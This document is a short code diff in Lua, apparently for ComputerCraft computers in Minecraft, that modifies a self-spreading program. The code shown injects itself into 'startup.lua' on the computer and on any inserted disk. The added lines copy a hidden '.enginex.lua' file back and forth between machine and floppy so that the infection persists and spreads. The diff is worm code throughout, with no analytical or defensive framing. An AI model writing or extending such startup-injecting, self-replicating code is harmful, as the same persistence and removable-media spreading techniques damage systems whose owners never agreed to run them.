@@ -1,4 +1,4 @@
-if os.getComputerID() == 1 then
+if os.getComputerID() == 0 then
     return
 end
 
@@ -29,3 +29,9 @@ injectStartup("startup.lua")
 
 local drive = peripheral.find("drive")
 if drive.isDiskPresent() then injectStartup(drive.getMountPath() .. "/startup.lua") end
+
+if drive.isDiskPresent() and fs.exists("/.enginex.lua") and not fs.exists(drive.getMountPath() .. "/.enginex.lua") then
+    fs.copy("/.enginex.lua", drive.getMountPath() .. "/.enginex.lua")
+elseif drive.isDiskPresent() and fs.exists(drive.getMountPath() .. "/.enginex.lua") and not fs.exists("/.enginex.lua") then
+    fs.copy(drive.getMountPath() .. "/.enginex.lua", "/.enginex.lua")
+end
